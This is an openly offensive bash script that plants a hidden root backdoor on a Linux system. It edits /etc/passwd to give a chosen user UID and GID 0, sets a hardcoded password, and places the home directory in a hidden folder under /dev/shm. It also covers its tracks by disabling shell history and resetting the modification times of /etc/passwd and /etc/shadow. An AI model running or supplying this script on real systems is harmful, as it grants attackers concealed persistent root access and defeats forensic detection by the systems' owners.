#!/usr/bin/env bash

# Privilege Check
if [[ $EUID -ne 0 ]]; then
  echo "[!] - you need to be root bro."
  exit 1
fi

# Disable Bash history
set +o history
echo "[i] - Nothing else will be recorded."

# Definition of variables
user=${1:-"miracle"}
password=${2:-"b4ckd00r3d"}

# Captures file modification time
mtime_passwd=$(stat -c "%y" /etc/passwd)
mtime_shadow=$(stat -c "%y" /etc/shadow)

# Displays the date and time the files were last modified
echo "[!] - /etc/passwd was modified @ ${mtime_passwd}"
echo "[!] - /etc/shadow was modified @ ${mtime_shadow}"

# Modify the /etc/passwd file
echo "[!] - setting ${user} uid and gid to 0 and enabling shell"
sed -i "s/.*${user}.*/${user}:x:0:0:${user}:\/dev\/shm\/.${user}:\/bin\/bash/" /etc/passwd

# Resets the modification time of the /etc/passwd file
echo "[!] - restoring mtime of /etc/passwd to ${mtime_passwd}"
touch -d "${mtime_passwd}" /etc/passwd

# Sets the user password
echo "[!] - setting ${user} password to ${password}"
echo "${user}:${password}" | chpasswd

# Resets the modification time of the /etc/shadow file
echo "[!] - restoring mtime of /etc/shadow to ${mtime_shadow}"
touch -d "${mtime_shadow}" /etc/shadow

# Create the home directory
echo "[!] - creating home directory in /dev/shm/.${user}"
mkdir -p "/dev/shm/.${user}"

# Settings to disable history, PROMPT_COMMAND and HISTFILE
echo "[!] - disabling bash history for ${user} user"
echo "set +o history" > "/dev/shm/.${user}/.bash_profile"
echo "set +o history" > "/dev/shm/.${user}/.bash_rc"
echo "unset HISTFILE" >> "/dev/shm/.${user}/.bash_profile"
echo "unset HISTFILE" >> "/dev/shm/.${user}/.bash_rc"
echo "unset PROMPT_COMMAND" >> "/dev/shm/.${user}/.bash_profile"
echo "unset PROMPT_COMMAND" >> "/dev/shm/.${user}/.bash_rc"

echo "[!] - Nice! Enjoy your new root account"
echo "[!] - ${user} : ${password}"

exit 0